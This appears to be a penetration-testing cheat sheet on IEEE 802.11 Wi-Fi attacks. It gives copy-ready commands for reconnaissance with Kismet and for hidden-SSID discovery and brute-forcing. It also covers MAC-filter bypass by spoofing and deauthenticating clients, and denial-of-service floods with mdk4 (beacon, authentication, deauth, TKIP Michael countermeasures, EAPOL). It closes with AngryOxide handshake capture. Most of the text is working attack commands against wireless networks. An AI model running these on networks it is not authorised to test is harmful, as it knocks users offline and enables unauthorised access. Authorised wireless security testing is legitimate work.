# 💥 Attacks

This file covers protocol-level attacks against **IEEE 802.11** networks, focusing on independent tools rather than full frameworks.  
It includes reconnaissance, flooding/DoS, SSID discovery, and MAC filtering bypass techniques.

## 📚 Resources

### Tools

- [Kismet](https://github.com/kismetwireless/kismet) - Passive sniffer and WIDS framework
- [MDK4](https://github.com/aircrack-ng/mdk4) - Wi-Fi stress testing and protocol exploitation
- [AngryOxide](https://github.com/Ragnt/AngryOxide)

## 📡 Information Gathering

### Router Security Databases

- [RouterSecurity.org](https://www.routersecurity.org) - Comprehensive guide on router configuration, security best practices, and known vulnerabilities.
- [RouterCVE.com](https://routercve.com) - Free CVE search engine for routers. Provides risk scores, patch status, and EOL tracking.
- [p0f3](https://lcamtuf.coredump.cx/p0f3/) - Passive TCP/IP fingerprinting tool

### Kismet

Kismet is a passive wireless sniffer, detector, and WIDS/WIPS framework. It captures and organizes network data without emitting frames, making it ideal for reconnaissance.

- 🔗 [Kismet Official](https://www.kismetwireless.net)
- 🛠️ [GitHub Repository](https://github.com/kismetwireless/kismet)

**Basic Commands**:

```bash
# Start Kismet with monitor interface and log directory
kismet -c wlan0mon -p ~/kismet_logs -t my_scan

# Specify a config file
kismet -c wlan0mon -f /etc/kismet/kismet.conf

# List available capture sources
kismet --list-sources
```

**Log Files**:

- `my_scan.kismet` : structured XML data
- `my_scan.pcapng` : raw packet capture (PCAP-NG)

**Web Interface** (available at `http://localhost:2501` after startup):

- Real-time AP and client view
- Signal graphs
- Event logs and alerts

## 🔍 Hidden SSID Discovery

When ESSID = `<length: 0>`, the SSID is hidden.

- **Passive method** - wait for a client to connect:

::: code-group

```bash [airodump-ng]
airodump-ng $interface -c $channel --bssid $bssid -w capture
```

```bash [angryoxide]
angryoxide -i wlan0mon --notransmit
```

:::

- **Active method** - Deauth attack, force a client to reconnect:

```bash
aireplay-ng -0 2 -a $bssid -c $client_mac -D $interface
```

### Brute-force SSID (Short SSIDs)

```bash
# Full brute-force with uppercase characters only
mdk4 $interface p -b u -c 1 -t $bssid

# Brute-force with uppercase and digits
mdk4 $interface p -b u,n -t $bssid

# Character sets: u (uppercase), n (digits), a (all), c (mixed case), m (mixed+numbers)
mdk4 $interface p -b u,l,n -t $bssid

# Test SSIDs from a wordlist
mdk4 $interface p -f /opt/wordlist.txt -t $bssid
```

## 🛡️ MAC Filtering Bypass

If an AP uses MAC filtering, you can spoof an authorized client's MAC address to gain access.

### Steps

1. **Identify an authorized client** from `airodump-ng` output (STATION column).
2. **Spoof your MAC address** to match the authorized client.

```bash
# Show current MAC address
macchanger $interface

# Spoof to a specific MAC (interface must be down)
ip link set $interface down
macchanger -m $authorized_mac $interface
ip link set $interface up
```

3. **Deauthenticate the legitimate client** to force it to reconnect (and possibly free up the AP).

::: code-group

```bash [aireplay-ng]
aireplay-ng -0 1 -a $bssid -c $authorized_mac $interface
```

```bash [mdk4]
mdk4 $interface d -b $bssid -c $authorized_mac -h $authorized_mac
```

:::

## 🌊 Flooding / DoS (MDK4)

MDK4 is a proof-of-concept tool to stress-test Wi-Fi networks by exploiting protocol weaknesses.

- 🔗 [GitHub Repository](https://github.com/aircrack-ng/mdk4)

### Beacon Flood

Floods the air with fake beacon frames, creating hundreds of fake APs. Can saturate Wi-Fi scanners and crash some drivers.

```bash
# Generate 1000 beacons per second with SSID "FakeAP"
mdk4 $interface b -n "FakeAP" -s 1000

# Randomize SSIDs (characters: uppercase, lowercase, digits)
mdk4 $interface b -n "FakeAP" -s 1000 -r
```

### Authentication DoS

Sends massive authentication requests to the target AP, saturating its ability to process new connections, potentially causing a crash or reboot.

```bash
# Flood AP with authentication requests
mdk4 $interface a -a $bssid -s 500

# Use a random source MAC to avoid filtering
mdk4 $interface a -a $bssid -s 500 -m
```

### Deauth / Disassoc

Mass-deauthenticates all clients from an AP. More aggressive than `aireplay-ng`.

```bash
# Deauth all clients on the target AP
mdk4 $interface d -b $bssid -c $channel

# Deauth a specific client
mdk4 $interface d -b $bssid -c $client_mac -h $client_mac
```

### Michael Exploit (TKIP)

Triggers Michael Countermeasures on APs using TKIP (WPA/WPA2). The AP will shut down for 1 minute, dropping all traffic.

```bash
# Force Michael Countermeasures on the target AP
mdk4 $interface m -t $bssid -j
```

### EAPOL Flood

Floods the AP with EAPOL Start frames, saturating it with fake sessions, making it unavailable to legitimate clients.

```bash
# Flood AP with EAPOL Start frames
mdk4 $interface e -t $bssid -s 500

# Also send EAPOL Logoff frames to disconnect clients
mdk4 $interface e -t $bssid -s 500 -l
```

### WIDS Confusion

Abuses WDS (Wireless Distribution System) to confuse WIDS/WIPS systems by making clients appear connected to multiple APs simultaneously.

```bash
# Confuse WIDS with fake cross-AP connections
mdk4 $interface w -e "MySSID" -z

# Specify the target BSSID
mdk4 $interface w -b $bssid -e "MySSID" -z
```

> **Note**: The `-z` flag activates the exploit that authenticates WDS clients on foreign APs, increasing confusion.

## AngryOxide

AngryOxide is a modern 802.11 attack tool written in Rust. It automates the collection of PMKID and EAPOL handshakes using a state-based attack engine.

- 🔗 [GitHub Repository](https://github.com/Ragnt/AngryOxide)

**Supported Protocols**: WPA, WPA2, WPA3 (Transition Mode)

**Key Attacks**:

- **PMKID Collection**: Automatically elicits PMKID from APs.
- **RSN Downgrade**: Attempts to force APs to downgrade to WPA2-CCMP (Probe Response Injection via RogueM2).
- **Rogue M2**: Collects EAPOL M2 from stations based on Probe Requests.
- **MFP Bypass**: Uses Anonymous Reassociation to force APs to deauthenticate their own clients.
- **Deauth / Disassoc**: Uses Wi-Fi 6e codes to prevent blacklisting.
- **Hidden SSID Discovery**: Direct probe requests.
- **Channel Switch Announcement**: Sends clients to adjacent channels.

**Basic Usage**:

```bash
# Launch attack on a specific target with active mode
sudo angryoxide -i wlan0mon -t AA:BB:CC:DD:EE:FF --active

# Run in headless mode (no TUI) and auto-exit when hash is captured
sudo angryoxide -i wlan0mon -t AA:BB:CC:DD:EE:FF --headless --autoexit
```
